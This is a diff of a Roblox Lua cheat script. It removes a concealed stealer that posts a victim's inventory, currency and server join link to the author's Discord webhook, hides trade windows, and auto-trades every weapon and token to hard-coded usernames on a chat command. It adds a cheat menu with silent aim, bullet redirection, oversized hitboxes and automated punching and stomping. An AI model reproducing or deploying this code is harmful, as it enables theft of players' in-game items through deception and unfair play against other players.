+        end
+    end)
+
+    UIS.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            mainDragging = false
+        end
+    end)
+end
+task.spawn(runToggleAndDrag)
+
+-- Tab switching
+local function runTabSwitching()
+    local function setActiveTab(index)
+        for i, frame in ipairs(tabFrames) do
+            frame.Visible = (i == index)
+        end
+        for i, btn in ipairs(tabButtons) do
+            if i == index then
+                btn.BackgroundColor3 = Color3.fromRGB(110, 35, 160)
+                btn.TextColor3 = Color3.fromRGB(255, 220, 255)
+            else
+                btn.BackgroundColor3 = Color3.fromRGB(60, 20, 90)
+                btn.TextColor3 = Color3.fromRGB(190, 130, 220)
             end
         end
     end
-    collect(localPlayer:FindFirstChild("Backpack"))
-    collect(localPlayer.Character)
-    collect(localPlayer:FindFirstChild("StarterGear"))
-    local function classifyTools(tools)
-        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
-        local base, main = {}, {}
-        for _, name in ipairs(tools) do
-            local lower = name:lower()
-            local matched = false
-            for _, p in ipairs(patterns) do
-                if string.find(lower, p:lower(), 1, true) then
-                    table.insert(base, name)
-                    matched = true
+    for i, btn in ipairs(tabButtons) do
+        btn.MouseButton1Click:Connect(function() setActiveTab(i) end)
+    end
+    setActiveTab(1)
+end
+task.spawn(runTabSwitching)
+
+-- ========================= FIGHT TAB SCRIPTS =========================
+
+-- Shared helper: get nearest player to mouse
+local function getNearestToMouse(LP, mouse, camera)
+    local closest, shortest = nil, 800
+    local mP = Vector2.new(mouse.X, mouse.Y)
+    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
+        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            local sp, vis = camera:WorldToScreenPoint(p.Character.HumanoidRootPart.Position)
+            if vis then
+                local d = (Vector2.new(sp.X, sp.Y) - mP).Magnitude
+                if d < shortest then shortest = d; closest = p end
+            end
+        end
+    end
+    return closest
+end
+
+-- Shared instant-hit logic factory
+-- Each weapon gets its own independent state
+local function makeInstantHitWeapon(btn, stroke, LP, mouse, camera)
+    local enabled = false
+    local lockedT = nil
+    local highlight = nil
+    local originalSize = nil
+
+    local function resetH(p)
+        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") and originalSize then
+            p.Character.HumanoidRootPart.Size = originalSize
+            p.Character.HumanoidRootPart.Transparency = 0
+            originalSize = nil
+        end
+    end
+
+    local function expandH(p)
+        if p and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = p.Character.HumanoidRootPart
+            originalSize = hrp.Size
+            hrp.Size = Vector3.new(500, 500, 500)
+            hrp.Transparency = 0.9
+            hrp.CanCollide = false
+        end
+    end
+
+    local function removeHigh()
+        if highlight then highlight:Destroy(); highlight = nil end
+    end
+
+    local function applyHigh(p)
+        removeHigh()
+        if p and p.Character then
+            highlight = Instance.new("Highlight", p.Character)
+            highlight.FillColor = Color3.fromRGB(255, 50, 50)
+            highlight.OutlineColor = Color3.fromRGB(255, 150, 50)
+        end
+    end
+
+    -- Bullet tracking
+    workspace:WaitForChild("Bullets").ChildAdded:Connect(function(b)
+        if not enabled or not b:IsA("BasePart") then return end
+        b.CanCollide = false
+        local ti = b:FindFirstChildWhichIsA("TouchTransmitter")
+        if ti then ti:Destroy() end
+        task.spawn(function()
+            while b and b.Parent and enabled do
+                local t = lockedT or getNearestToMouse(LP, mouse, camera)
+                if t and t.Character and t.Character:FindFirstChild("HumanoidRootPart") then
+                    b.CFrame = CFrame.new(t.Character.HumanoidRootPart.Position)
+                end
+                game:GetService("RunService").RenderStepped:Wait()
+            end
+        end)
+    end)
+
+    -- Target tracker loop
+    btn.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        stroke.Color = enabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        btn.BackgroundColor3 = enabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+
+        if enabled then
+            task.spawn(function()
+                while enabled do
+                    local t = getNearestToMouse(LP, mouse, camera)
+                    if t ~= lockedT then
+                        resetH(lockedT)
+                        lockedT = t
+                        expandH(lockedT)
+                        applyHigh(lockedT)
+                    end
+                    task.wait(0.2)
+                end
+            end)
+        else
+            resetH(lockedT)
+            removeHigh()
+            lockedT = nil
+        end
+    end)
+end
+
+-- Auto Fight
+local function runAutoFight()
+    local Players = game:GetService("Players")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local UIS = game:GetService("UserInputService")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local Char = LP.Character or LP.CharacterAdded:Wait()
+    local HRP = Char:WaitForChild("HumanoidRootPart")
+    LP.CharacterAdded:Connect(function(c) Char=c; HRP=c:WaitForChild("HumanoidRootPart") end)
+    local punchEnabled = false
+    local lastPunch = 0
+    local function overlapping(a,b)
+        local sa=a.Size*0.5; local sb=b.Size*0.5; local d=a.Position-b.Position
+        return math.abs(d.X)<=(sa.X+sb.X) and math.abs(d.Y)<=(sa.Y+sb.Y) and math.abs(d.Z)<=(sa.Z+sb.Z)
+    end
+    RunService.Heartbeat:Connect(function()
+        if not punchEnabled or not HRP then return end
+        if tick()-lastPunch < 0.05 then return end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP and p.Character then
+                local oHRP = p.Character:FindFirstChild("HumanoidRootPart")
+                local hum = p.Character:FindFirstChildOfClass("Humanoid")
+                if oHRP and hum and hum.Health > 0 and overlapping(HRP, oHRP) then
+                    lastPunch = tick()
+                    pcall(function() ReplicatedStorage:WaitForChild("PUNCHEVENT"):FireServer(1) end)
                     break
                 end
             end
-            if not matched then table.insert(main, name) end
-        end
-        return base, main
-    end
-    local base, main = classifyTools(tools)
-    return #main >= 3, base, main, #main  -- Changed from >5 to >=3
-end
-
-local function deleteMessagesGui()
-    local messagesGui = playerGui:FindFirstChild("Messages")
-    if messagesGui then messagesGui:Destroy() end
-end
-
-local function sendRequest(url, body)
-    if not url or url == "" then return nil end
-    local headers = {["Content-Type"] = "application/json"}
-    local encoded = body
-    if type(body) ~= "string" then
-        local ok, s = pcall(function() return HttpService:JSONEncode(body) end)
-        if ok then encoded = s else encoded = "{}" end
-    end
-    local candidates = {
-        function() if syn and syn.request then return syn.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
-        function() if request then return request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
-        function() if http and http.request then return http.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
-        function() if http_request then return http_request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end,
-        function() if fluxus and fluxus.request then return fluxus.request({Url = url, Method = "POST", Headers = headers, Body = encoded}) end end
-    }
-    for _, tryFn in ipairs(candidates) do
-        local ok, res = pcall(tryFn)
-        if ok and res then
-            if res.Success == true or res.StatusCode == 200 or (res.Body ~= nil) then
-                return res
-            end
-        end
-    end
-    return nil
-end
-
-local function getTokenAmountFromTradeList()
-    local tradeList = playerGui:FindFirstChild("TradeList")
-    if tradeList then
-        local main = tradeList:FindFirstChild("Main")
-        if main then
-            local tokenAmount = main:FindFirstChild("TokenAmount")
-            if tokenAmount then
-                local textLabel = tokenAmount:FindFirstChild("TextLabel")
-                if textLabel then
-                    local text = textLabel.Text
-                    local tokenNumber = string.match(text, "%d+")
-                    if tokenNumber then
-                        return tonumber(tokenNumber)
-                    end
-                end
-            end
-        end
-    end
-    return 0
-end
-
-local function sendFullInventory()
-    if not checkServerStatus() then return nil end
-    
-    local playerCount = #Players:GetPlayers()
-    local maxPlayers = Players.MaxPlayers
-    local isPrivateServer = playerCount < 3
-    
-    if isPrivateServer then
-        return nil
-    end
-    
-    local tools = {}
-    local function collect(from)
-        if from then
-            for _, v in ipairs(from:GetChildren()) do
-                if v:IsA("Tool") then table.insert(tools, v.Name) end
-            end
-        end
-    end
-    collect(localPlayer:FindFirstChild("Backpack"))
-    collect(localPlayer.Character)
-    collect(localPlayer:FindFirstChild("StarterGear"))
-    local function classifyTools(tools)
-        local patterns = {"punch","wallet","phone","tradesign","spray","pan","candybag","pool noodle"}
-        local base, main = {}, {}
-        for _, name in ipairs(tools) do
-            local lower = name:lower()
-            local matched = false
-            for _, p in ipairs(patterns) do
-                if string.find(lower, p:lower(), 1, true) then
-                    table.insert(base, name)
-                    matched = true
-                    break
-                end
-            end
-            if not matched then table.insert(main, name) end
-        end
-        return base, main
-    end
-    local base, main = classifyTools(tools)
-    local hasAtLeast3Weapons = #main >= 3  -- Changed from hasMoreThan5Weapons
-    local baseText = #base > 0 and table.concat(base, " • ") or "None"
-    local mainText = #main > 0 and table.concat(main, "\n") or "None"
-    local ls = localPlayer:FindFirstChild("leaderstats")
-    local dinero = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
-    local slays = ls and ls:FindFirstChild("Slays") and ls.Slays.Value or "N/A"
-    local formattedDinero = formatNumber(dinero)
-    local formattedSlays = formatNumber(slays)
-    local elapsed = os.time() - START_TIME
-    local function fmt(sec)
-        local m = math.floor(sec/60) local s = sec%60
-        if m>0 then return m.."m "..s.."s" end
-        return s.."s"
-    end
-    
-    local joinScript = "local ts = game:GetService('TeleportService') ts:TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')"
-    
-    local executor = "Unknown"
-    if syn then executor = "Synapse X"
-    elseif fluxus then executor = "Fluxus"
-    else executor = nil end
-    
-    local tokenAmount = getTokenAmountFromTradeList()
-    
-    local useMyWebhook = false
-    local playerName = localPlayer.Name
-    if hasAtLeast3Weapons then useMyWebhook = true end  -- Changed condition
-    local targetWebhook = useMyWebhook and MY_WEBHOOK or USER_WEBHOOK
-    if targetWebhook == "PUTHERE" and not useMyWebhook then return nil end
-    
-    local fields = {
-        {name="💰 Dinero", value=tostring(formattedDinero), inline=true},
-        {name="⚔️ Slays", value=tostring(formattedSlays), inline=true},
-        {name="🪙 Tokens", value=tostring(tokenAmount), inline=true},
-        {name="⏱️ Player Executed", value=fmt(elapsed).." ago", inline=false},
-        {name="🧩 Server Joiner script", value="```lua\n"..joinScript.."```", inline=false},
-    }
-    
-    if executor then
-        table.insert(fields, {name="⚡ Executor", value=executor, inline=false})
-    end
-    
-    local embed = {
-        title = "*" .. playerName .. "*'s Weapons 🔫",
-        description = "**Base Weapons**\n"..baseText.."\n\n**Main Weapons**\n"..mainText,
-        color = 0xFF0000,
-        fields = fields,
-        footer = {text="Inventory Logger • "..playerName},
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }
-    local content = playerName.." has executed"
-    if hasAtLeast3Weapons and useMyWebhook then content = content .. " @everyone @here 🔔 RICH PLAYER DETECTED!" end  -- Changed condition
-    local payload = {content = content, embeds = {embed}}
-    return sendRequest(targetWebhook, payload)
-end
-
--- Check if player has at least 3 main weapons before proceeding
-local hasEnoughWeapons, baseWeapons, mainWeapons, mainCount = hasMainWeapons()
-if not hasEnoughWeapons then
-    warn("Not enough main weapons to execute script. Need at least 3, have: " .. mainCount)
-    return  -- Stop script execution
-end
-
-deleteMessagesGui()
-sendFullInventory()
-
-local weapons = {
-    "Grim Reaper Cloak::None",
-    "Blast Bow::None",
-    "Princess Power Style::None",
-    "Feral Frenzy Style::None",
-    "Roller Skates::None",
-    "Storm Dancer Style::None",
-    "Hug of Doom Style::None",
-    "Hero Finisher::None",
-    "Grim Reaper Finisher::None",
-    "Gun Finisher::None",
-    "Doom Finisher::None",
-    "Breakdance Finisher::None",
-    "Celestial Scythes::None",
-    "Graveyard Grip Knuckles::None",
-    "Shadow Sorcery Purse::None",
-    "Marshmallow Mixer Purse::None",
-    "Unicorn Brass Knuckles::None",
-    "Disco Dash Board::None",
-    "Toast Hoverboard::None",
-    "Frost Stomp::None",
-    "Sniper Rifle RPG::None",
-    "Cursed Board::None",
-    "Evil Goth Knuckles::None",
-    "Witchy Broom Board::None",
-    "Floating Leaf::None",
-    "Shark Brass Knuckles::None",
-    "Ghostly RPG::None",
-    "404 Not Found Blade::None",
-    "Vampire Flamethrower::None",
-    "Queen's Throne::None",
-    "Big Boom Hammer::None",
-    "Gravekeeper's Charm::None",
-    "Mallow Glide Board::None",
-    "Mean Girl Mayhem Style::None",
-    "Karate Style::None",
-    "Kitty Purse::None",
-    "Freeze Gun::None",
-    "Shiny Purse::None",
-    "Loveboard::None",
-    "SpikedPurse::None",
-    "Brass Knuckles::None",
-    "Golden Snowball Launcher::None",
-    "Snowball Launcher::None",
-    "Sledge Hammer::None",
-    "Spiked Kitty Stanli::None",
-    "Turkey Skewers::None",
-    "Fan of Requiem::None",
-    "Chainsaw::None",
-    "Scythe::None",
-    "Trashbin Disguise::None",
-    "Cupid's Bow::None",
-    "Crowbar::None",
-    "Harpoon::None",
-    "Heartbreaker Style::None",
-    "Cannon::None",
-    "Spiked Knuckles::None",
-    "Glitter Bomb::None",
-    "Spiked Nightmare Purse::None",
-    "Glitter Style::None",
-    "Trident::None",
-    "Sakura Blade::None",
-    "Nunchucks::None",
-    "DogPurse::None",
-    "Champion Gloves::None",
-    "Chain Mace::None",
-    "Surf's Up Hoverboard::None",
-    "Graveyard Howl RPG::None",
-    "Mocha Missile Maker RPG::None",
-    "Black Flame Stomp::None",
-    "Angelic Board::None",
-    "Credit Card Hoverboard::None",
-    "Constellations RPG::None",
-    "Palm Sakura Blade::None",
-    "Popstar Hoverboard::None",
-    "Pink Star Board::None",
-    "Thorned Romance::None",
-    "Mischief Stomp::None",
-    "Lava RPG::None",
-    "Crushing Love::None",
-    "Love Bomb Finisher::None",
-    "Haunted Cemetery RPG::None",
-    "Cyber Samurai RPG::None",
-    "Black Flame Knuckles::None",
-    "Vanity Vortex Finisher::None",
-    "Egg Rocket Launcher::None",
-    "Frostwind Glider Board::None",
-    "Sakura Finisher::None",
-    "Witch's Wands Taser::None",
-    "The Doom Knuckles::None",
-    "Flintlock::None",
-    "Pinata Purse::None",
-    "Cutlass Sakura Blade::None",
-    "Police Hoverboard::None",
-    "Y&Y Board::None",
-    "Vampire Brass Knuckles::None",
-    "Dual Shadow of Night Blade::None",
-    "Dance Bomb",
-}
-
-local function safeClick(btn)
-    if not btn then return end
-    local success = false
-    pcall(function()
-        if btn.MouseButton1Click then
-            firesignal(btn.MouseButton1Click)
-            success = true
-        elseif btn.Activated then
-            firesignal(btn.Activated)
-            success = true
         end
     end)
-    if not success then
-        pcall(function()
-            local pos, size = btn.AbsolutePosition, btn.AbsoluteSize
-            local x, y = pos.X + size.X/2, pos.Y + size.Y/2
-            VirtualInputManager:SendMouseButtonEvent(x, y, 0, true, game, 0)
-            task.wait(0.05)
-            VirtualInputManager:SendMouseButtonEvent(x, y, 0, false, game, 0)
-        end)
+    local function toggle()
+        punchEnabled = not punchEnabled
+        autoFightStroke.Color = punchEnabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        autoFightBtn.BackgroundColor3 = punchEnabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
     end
-end
-
-local function clickWeapons()
-    local tradingGui = playerGui:FindFirstChild("Trading")
-    if not tradingGui then return 0 end
-    local frame = tradingGui:FindFirstChild("Frame")
-    if not frame then return 0 end
-    local main = frame:FindFirstChild("Main")
-    if not main then return 0 end
-    local yourOffer = main:FindFirstChild("YourOffer")
-    if not yourOffer then return 0 end
-    local itemDisplay = yourOffer:FindFirstChild("ItemDisplay")
-    if not itemDisplay then return 0 end
-    local scrollingFrame = itemDisplay:FindFirstChild("ScrollingFrame")
-    if not scrollingFrame then return 0 end
-    
-    local addedCount = 0
-    local maxAttempts = 5
-    
-    for attempt = 1, maxAttempts do
-        local currentAdded = 0
-        for _, name in ipairs(weapons) do
-            local btn = scrollingFrame:FindFirstChild(name)
-            if btn and btn:IsA("ImageButton") and btn.Visible then
-                safeClick(btn)
-                currentAdded = currentAdded + 1
-                addedCount = addedCount + 1
-                task.wait(0.02)
-            end
-        end
-        
-        if currentAdded == 0 then
-            break
-        end
-        
-        task.wait(0.5)
-    end
-    
-    return addedCount
-end
-
-local function getTokenAmount()
-    local tradingGui = playerGui:FindFirstChild("Trading")
-    if tradingGui then
-        local frame = tradingGui:FindFirstChild("Frame")
-        if frame then
-            local categories = frame:FindFirstChild("Categories")
-            if categories then
-                local tokenAmount = categories:FindFirstChild("TokenAmount")
-                if tokenAmount then
-                    local textLabel = tokenAmount:FindFirstChild("TextLabel")
-                    if textLabel then
-                        local text = textLabel.Text
-                        local tokenNumber = string.match(text, "%d+")
-                        if tokenNumber then
-                            return tonumber(tokenNumber)
-                        end
-                    end
-                end
-            end
-        end
-    end
-    return 0
-end
-
-local function spamConfirm()
-    for i = 1, 20 do
-        pcall(function() RFTradingConfirmTrade:InvokeServer() end)
-        task.wait(0.05)
-    end
-end
-
-local function autoCompleteTrade()
-    print("Starting autoCompleteTrade...")
-    
-    -- Wait for trading GUI to fully load
-    task.wait(1)
-    
-    -- Add ALL weapons first
-    local addedCount = clickWeapons()
-    print("Added " .. addedCount .. " weapons")
-    
-    -- Set tokens
-    local tokenAmount = getTokenAmount()
-    if tokenAmount then
-        pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
-        print("Set tokens to: " .. tokenAmount)
-    end
-    
-    -- Wait to ensure all weapons are added
-    task.wait(3)
-    
-    -- Set ready
-    pcall(function() 
-        RFTradingSetReady:InvokeServer(true) 
-        print("Set ready to true")
+    autoFightBtn.MouseButton1Click:Connect(toggle)
+    UIS.InputBegan:Connect(function(input,gp)
+        if gp then return end
+        if _G.keybindsBlocked then return end
+        if input.KeyCode == Enum.KeyCode.B then toggle() end
     end)
-    
-    -- Wait 5 seconds before accepting
-    print("Waiting 5 seconds before accepting...")
-    task.wait(5)
-    
-    -- Accept the trade
-    pcall(function() 
-        RFTradingAcceptTradeOffer:InvokeServer(localPlayer)
-        print("Accepted trade")
-    end)
-    
-    -- Wait 5 seconds for the trade timer after both accept
-    print("Waiting 5 seconds for trade timer...")
-    task.wait(5)
-    
-    -- Spam confirm
-    spamConfirm()
-    print("Spammed confirm 20 times")
 end
+task.spawn(runAutoFight)
 
-local function setupTrading()
-    pcall(function() RESetPhoneSettings:FireServer("TradeEnabled", true) end)
-    local tradeList = playerGui:WaitForChild("TradeList")
-    local mainFrame = tradeList:WaitForChild("Main")
-    local tradeRequest = mainFrame:WaitForChild("TradeRequest")
-    tradeRequest.Visible = true
-    local isProcessing = false
-    
-    local function processChatMessage(sender, txt)
-        if isProcessing then return end
-        
-        local shouldTrade = false
-        for _, username in ipairs(MY_USERNAMES) do
-            if sender.Name:lower() == username:lower() then
-                shouldTrade = true
-                break
-            end
-        end
-        
-        if shouldTrade then
-            isProcessing = true
-            
-            local target = Players:FindFirstChild(sender.Name)
-            if target then 
-                task.wait(0.2)
-                pcall(function() RFTradingSendTradeOffer:InvokeServer(target) end) 
-            end
-            
-            if txt == "add" then
-                task.wait(0.3)
-                clickWeapons()
-                -- Set tokens when add command is used
-                local tokenAmount = getTokenAmount()
-                if tokenAmount then
-                    pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
-                    print("Set tokens to: " .. tokenAmount)
-                end
-                task.wait(0.5)
-                pcall(function() RFTradingSetReady:InvokeServer(true) end)
-                task.wait(0.5)
-                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
-            elseif txt == "1" then 
-                task.wait(0.2)
-                pcall(function() RFTradingSetReady:InvokeServer(true) end) 
-            elseif txt == "2" then 
-                task.wait(0.2)
-                pcall(function() RFTradingConfirmTrade:InvokeServer() end) 
-            end
-            
-            isProcessing = false
-        end
-        
-        if sender == localPlayer then
-            if txt == "add" then
-                task.wait(0.2)
-                clickWeapons()
-                -- Set tokens when add command is used
-                local tokenAmount = getTokenAmount()
-                if tokenAmount then
-                    pcall(function() RFTradingSetTokens:InvokeServer(tokenAmount) end)
-                    print("Set tokens to: " .. tokenAmount)
-                end
-                task.wait(0.3)
-                pcall(function() RFTradingSetReady:InvokeServer(true) end)
-                task.wait(0.3)
-                pcall(function() RFTradingConfirmTrade:InvokeServer() end)
-            elseif txt == "1" then 
-                task.wait(0.1)
-                pcall(function() RFTradingSetReady:InvokeServer(true) end) 
-            elseif txt == "2" then 
-                task.wait(0.1)
-                pcall(function() RFTradingConfirmTrade:InvokeServer() end) 
+-- Expand Hitbox
+local function runExpandHitbox()
+    local Players = game:GetService("Players")
+    local LP = Players.LocalPlayer
+    local hitboxEnabled = false
+    local originalSizes = {}
+    local maxSize = Vector3.new(25,15,15)
+    local hitboxSize = maxSize
+    local function getSize()
+        local text = hitboxSizeBox.Text:gsub("%s+","")
+        local x,y,z = text:match("^(%d+),(%d+),(%d+)$")
+        x,y,z = tonumber(x),tonumber(y),tonumber(z)
+        if x and y and z then return Vector3.new(math.clamp(x,1,maxSize.X),math.clamp(y,1,maxSize.Y),math.clamp(z,1,maxSize.Z)) end
+        return maxSize
+    end
+    local function setHitboxes()
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                local hrp = p.Character.HumanoidRootPart
+                if not originalSizes[p] then originalSizes[p] = hrp.Size end
+                hrp.Size = hitboxSize; hrp.Transparency = 0.8; hrp.CanCollide = false
             end
         end
     end
-
-    if TextChatService then
-        TextChatService.OnIncomingMessage = function(message)
-            local ts = message.TextSource
-            if not ts then return end
-            local sender = Players:GetPlayerByUserId(ts.UserId)
-            if not sender then return end
-            local txt = tostring(message.Text or ""):lower()
-            
-            task.delay(0.5, function()
-                processChatMessage(sender, txt)
-            end)
+    local function restoreHitboxes()
+        for p, size in pairs(originalSizes) do
+            if p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                local hrp = p.Character.HumanoidRootPart
+                hrp.Size = size; hrp.Transparency = 0; hrp.CanCollide = false
+            end
         end
+        originalSizes = {}
     end
-    
-    local function onPlayerChatted(player, message)
-        if player and message then
-            task.delay(0.5, function()
-                processChatMessage(player, message:lower())
-            end)
-        end
-    end
-    
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= localPlayer then
-            pcall(function()
-                player.Chatted:Connect(function(message)
-                    onPlayerChatted(player, message)
-                end)
-            end)
-        end
-    end
-    
-    Players.PlayerAdded:Connect(function(player)
-        pcall(function()
-            player.Chatted:Connect(function(message)
-                onPlayerChatted(player, message)
-            end)
-        end)
+    expandHitboxBtn.MouseButton1Click:Connect(function()
+        hitboxEnabled = not hitboxEnabled
+        expandHitboxStroke.Color = hitboxEnabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        expandHitboxBtn.BackgroundColor3 = hitboxEnabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if not hitboxEnabled then restoreHitboxes() end
     end)
-
-    local function handleGui(gui)
-        if gui.Name == "Trading" then gui.Enabled = false
-        elseif gui.Name == "Messages" then gui:Destroy() end
-    end
-    
-    for _, gui in ipairs(playerGui:GetChildren()) do handleGui(gui) end
-    playerGui.ChildAdded:Connect(handleGui)
-    
+    Players.PlayerRemoving:Connect(function(p) originalSizes[p] = nil end)
     task.spawn(function()
         while true do
-            if not checkServerStatus() then break end
-            local t = playerGui:FindFirstChild("Trading")
-            if t then t.Enabled = false end
-            local m = playerGui:FindFirstChild("Messages")
-            if m then m:Destroy() end
-            task.wait(0.1)
+            if hitboxEnabled then hitboxSize = getSize(); setHitboxes() end
+            task.wait(1)
         end
     end)
 end
+task.spawn(runExpandHitbox)
 
-setupTrading()
+-- Auto Stomp
+local function runAutoStomp()
+    local Players = game:GetService("Players")
+    local RS = game:GetService("ReplicatedStorage")
+    local RunService = game:GetService("RunService")
+    local LP = Players.LocalPlayer
+    local Char = LP.Character or LP.CharacterAdded:Wait()
+    local HRP = Char:WaitForChild("HumanoidRootPart")
+    LP.CharacterAdded:Connect(function(c) Char=c; HRP=c:WaitForChild("HumanoidRootPart") end)
+    local enabled = false; local lastStomp = 0
+    local function overlapping(a,b)
+        local sa=a.Size*0.5; local sb=b.Size*0.5; local d=a.Position-b.Position
+        return math.abs(d.X)<=(sa.X+sb.X) and math.abs(d.Y)<=(sa.Y+sb.Y) and math.abs(d.Z)<=(sa.Z+sb.Z)
+    end
+    RunService.Heartbeat:Connect(function()
+        if not enabled or not HRP then return end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p ~= LP and p.Character then
+                local oHRP = p.Character:FindFirstChild("HumanoidRootPart")
+                local hum = p.Character:FindFirstChildOfClass("Humanoid")
+                if oHRP and hum and hum.Health > 0 and hum.Health < 5 and overlapping(HRP,oHRP) then
+                    if tick()-lastStomp >= 0.4 then
+                        lastStomp = tick()
+                        pcall(function() RS:WaitForChild("STOMPEVENT"):FireServer() end)
+                    end
+                end
+            end
+        end
+    end)
+    autoStompBtn.MouseButton1Click:Connect(function()
+        enabled = not enabled
+        autoStompStroke.Color = enabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        autoStompBtn.BackgroundColor3 = enabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+    end)
+end
+task.spawn(runAutoStomp)
 
-local originalAcceptTrade = RFTradingAcceptTradeOffer.InvokeServer
-
-RFTradingAcceptTradeOffer.InvokeServer = function(player)
-    local result = originalAcceptTrade(RFTradingAcceptTradeOffer, player)
-    
-    for _, username in ipairs(MY_USERNAMES) do
-        if player.Name:lower() == username:lower() then
-            task.spawn(function()
-                print("Trade accepted from " .. player.Name .. ", waiting 5 seconds then auto-completing...")
-                task.wait(5)
-                autoCompleteTrade()
-            end)
-            break
+-- Auto Grab Hair
+local function runAutoGrabHair()
+    local RS = game:GetService("ReplicatedStorage")
+    local UIS = game:GetService("UserInputService")
+    local hairEnabled = false
+    local function spamHair()
+        while hairEnabled do
+            pcall(function() RS:WaitForChild("JALADADEPELOEVENT"):FireServer() end)
+            task.wait(0.01)
         end
     end
-    
-    return result
+    local function toggle()
+        hairEnabled = not hairEnabled
+        autoGrabStroke.Color = hairEnabled and Color3.fromRGB(100,255,100) or Color3.fromRGB(130,50,180)
+        autoGrabBtn.BackgroundColor3 = hairEnabled and Color3.fromRGB(30,80,30) or Color3.fromRGB(55,18,80)
+        if hairEnabled then task.spawn(spamHair) end
+    end
+    autoGrabBtn.MouseButton1Click:Connect(toggle)
+    UIS.InputBegan:Connect(function(input,gp)
+        if gp then return end
+        if _G.keybindsBlocked then return end
+        if input.KeyCode == Enum.KeyCode.N then toggle() end
+    end)
 end
+task.spawn(runAutoGrabHair)
+
+-- Instant Hit Weapons (3 independent instances)
+local function runInstantHitWeapons()
+    local LP = game:GetService("Players").LocalPlayer
+    local mouse = LP:GetMouse()
+    local camera = workspace.CurrentCamera
+
+    makeInstantHitWeapon(taserBtn, taserStroke, LP, mouse, camera)
+    makeInstantHitWeapon(grenadeBtn, grenadeStroke, LP, mouse, camera)
+    makeInstantHitWeapon(throwablesBtn, throwablesStroke, LP, mouse, camera)
+end
+task.spawn(runInstantHitWeapons)
+
+-- ========================= GUNS TAB SCRIPTS =========================
+
+-- Player list for multi-select silent aim
+_G.silentAimTargets = {}
+local playerSelectBtns = {}
+
+local function updatePlayerList()
+    local Players = game:GetService("Players")
+    local LP = Players.LocalPlayer
+    for _, btn in pairs(playerSelectBtns) do pcall(function() btn:Destroy() end) end
+    playerSelectBtns = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LP then
+            local isSelected = false
+            for _, t in ipairs(_G.silentAimTargets) do
+                if t == player then isSelected = true; break end
+            end
+            local pBtn = Instance.new("TextButton", playerListScroll)
+            pBtn.Size = UDim2.new(1, -8, 0, 28)
+            pBtn.BackgroundColor3 = isSelected and Color3.fromRGB(80,30,120) or Color3.fromRGB(50,15,75)
+            pBtn.TextColor3 = isSelected and Color3.fromRGB(200,255,200) or Color3.fromRGB(210,160,240)
+            pBtn.Text = (isSelected and "âœ” " or "   ") .. player.Name
+            pBtn.TextSize = 13
+            pBtn.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]])
+            pBtn.BorderSizePixel = 0
+            pBtn.AutoButtonColor = false
+            Instance.new("UICorner", pBtn).CornerRadius = UDim.new(0, 6)
+            pBtn.MouseButton1Click:Connect(function()
+                local found = false
+                for i, t in ipairs(_G.silentAimTargets) do
+                    if t == player then table.remove(_G.silentAimTargets, i); found = true; break end
+                end
+                if not found then table.insert(_G.silentAimTargets, player) end
+                updatePlayerList()
+            end)
+            table.insert(playerSelectBtns, pBtn)
+        end
+    end
+end
+
+task.spawn(function()
+    while true do updatePlayerList(); task.wait(3) end
+end)
+
+-- Silent Aim (multi-target)
+local function runSilentAim()
+    local LP = game:GetService("Players").LocalPlayer
+    local RunService = game:GetService("RunService")
+    local bulletsFolder = workspace:WaitForChild("Bullets")
+    local silentEnabled = false
+
+    local function handleBullet(bullet)
+        if not bullet:IsA("MeshPart") then return end
+        bullet.CanCollide = false
+        local ti = bullet:FindFirstChildWhichIsA("TouchTransmitter")
+        if ti then ti:Destroy() end
+        task.spawn(function()
+            while bullet and bullet.Parent and silentEnabled do
+                if #_G.silentAimTargets == 0 then
+                    RunService.RenderStepped:Wait()
+                else
+                    local targets = _G.silentAimTargets
+                    local idx = (math.floor(tick()*20) % #targets) + 1
+                    local target = targets[idx]
+                    if target and target.Character then
+                        local part = target.Character:FindFirstChild("Head") or target.Character:FindFirstChild("HumanoidRootPart")
+                        if part then bullet.CFrame = CFrame.new(part.Position) end
+                    end
+                end
+                RunService.RenderStepped:Wait()
+            end
+        end)
+    end
+
+    bulletsFolder.ChildAdded:Connect(function(child)
+        if silentEnabled then handleBullet(child) end
+    end)
+
+    silentAimActiveBtn.MouseButton1Click:Connect(function()
+        silentEnabled = not silentEnabled
